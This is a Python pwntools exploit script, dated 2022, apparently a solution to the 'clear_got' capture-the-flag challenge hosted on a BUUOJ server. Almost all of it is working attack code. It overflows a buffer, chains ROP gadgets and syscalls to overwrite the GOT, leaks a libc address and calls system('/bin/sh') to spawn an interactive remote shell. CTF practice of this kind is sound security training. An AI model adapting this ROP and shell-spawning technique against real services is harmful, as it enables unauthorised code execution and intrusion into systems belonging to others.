# -*- encoding: utf-8 -*-
import sys 
import os 
import requests
from pwn import * 
binary = './clear_got'
os.system('chmod +x %s'%binary)
context.binary = binary
context.log_level = 'debug'
elf = ELF(binary)
libc = elf.libc
libc = ELF('./libc-2.23-buu.so')
DEBUG = 0
if DEBUG:
    libc = elf.libc
    p = process(binary)
    # p = process(['qemu-arm', binary])
    # p = process(['qemu-arm','-g','1234', binary])
    # p = process(['qemu-aarch64','-L','','-g','1234',binary])
else:
    host = 'node4.buuoj.cn'
    port = '28198'
    p = remote(host,port)

l64 = lambda            : ras(u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00')))
l32 = lambda            : ras(u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00')))
uu64= lambda a          : ras(u64(p.recv(a).ljust(8,'\x00')))
uu32= lambda a          : ras(u32(p.recv(a).ljust(4,'\x00')))
rint= lambda x = 12     : ras(int( p.recv(x) , 16))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': \033[1;36m 0x%x \033[0m' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))

def ras( data ):
    lg('leak' , data)
    return data

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def one_gadget(filename):
    log.success('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(['one_gadget','--raw', '-f',filename])).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla(':',num)

# one_gad = one_gadget(libc.path)

def attack():

    stdout = 0x601060
    pop_rdi_ret = 0x00000000004007f3
    pop_rsi_r15_ret = 0x00000000004007f1
    rax_syscall_ret = 0x000000000400777
    syscall_ret = 0x000000000040077E
    syscall_ret1 = 0x00000000040076E
    main_addr = 0x0000000004006F3
    leave_ret = 0x0000000000400761
    ret = 0x000000000400762

    fake_puts = 0x0000000000400773
    fake_funk = 0x0000000000400782
    fake_read = 0x000000000040076E
    got = 0x0000000000601018

    # dbg('*0x000000000400762')
    got_table = flat(
        ret , ret,
        ret , ret,
        fake_read , 0,
        main_addr
    )

    payload = flat(
        pop_rdi_ret , 0,
        pop_rsi_r15_ret , got , 0,
        syscall_ret ,
        pop_rdi_ret , 1,
        pop_rsi_r15_ret , stdout , 0,
        rax_syscall_ret,
        main_addr
    )


    sa('competition.///' , 'a'*0x60 + p64(0x601080) + payload )

    # # dbg()
    raw_input()
    se(got_table)

    libc.address = l64() - libc.sym['_IO_2_1_stdout_']
    system_addr = libc.sym['system']
    binsh_addr = libc.search('/bin/sh\x00').next()

    raw_input()
    payload = p64(ret) + p64(pop_rdi_ret) + p64(binsh_addr) + p64(system_addr)

    se(payload)

    # p.success(getShell())
    p.interactive()

attack()

'''
@File    :   clear_got.py
@Time    :   2022/02/12 15:54:52
@Author  :   Niyah 
'''